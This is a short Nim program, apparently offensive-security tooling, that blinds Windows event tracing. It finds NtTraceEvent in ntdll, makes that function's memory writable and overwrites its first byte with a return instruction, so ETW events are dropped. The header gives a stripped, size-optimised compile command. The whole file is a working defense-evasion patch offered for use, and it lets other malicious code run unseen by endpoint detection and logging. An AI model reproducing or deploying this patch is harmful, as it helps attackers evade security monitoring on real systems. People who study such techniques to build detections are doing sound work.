#[
    Author: Haunted-Banshee
    License: BSD 3-Clause
    Using  patch the syscall NtTraceEvent which is called by a lot of functions.
    References:
        - https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c
    Compile:
        nim c -d=mingw --app=console -d:danger --hints:off --passc=-flto --passl=-flto -d:strip --opt:size --cpu=amd64 bypass-etw-NtTraceEvent.nim
]#


import dynlib
import winim/lean
import strformat

proc PatchEtw(): bool =
    var
        ntdll: LibHandle
        dwOld: DWORD = 0
        cs: pointer
        disabled: bool = false
        a: ULONG

    const offset:array[1,byte] = [byte 0xC3]

    ntdll = loadLib("ntdll")
    if isNil(ntdll):
        echo "[X] Failed to load ntdll.dll"
        return disabled

    cs = ntdll.symAddr("NtTraceEvent") 
    if isNil(cs):
        echo "[X] Failed to get the address of 'NtTraceEvent'"
        return disabled

    if VirtualProtect(cs, offset.len, 0x40, addr dwOld):
        echo "[*] Applying ETW patch"
        copyMem(cs, unsafeAddr offset, offset.len)
        VirtualProtect(cs, offset.len, a, addr dwOld)
        disabled = true

    return disabled    

when isMainModule:
    var success = PatchEtw()
    echo fmt"[*] ETW blocked by patch: {bool(success)}"
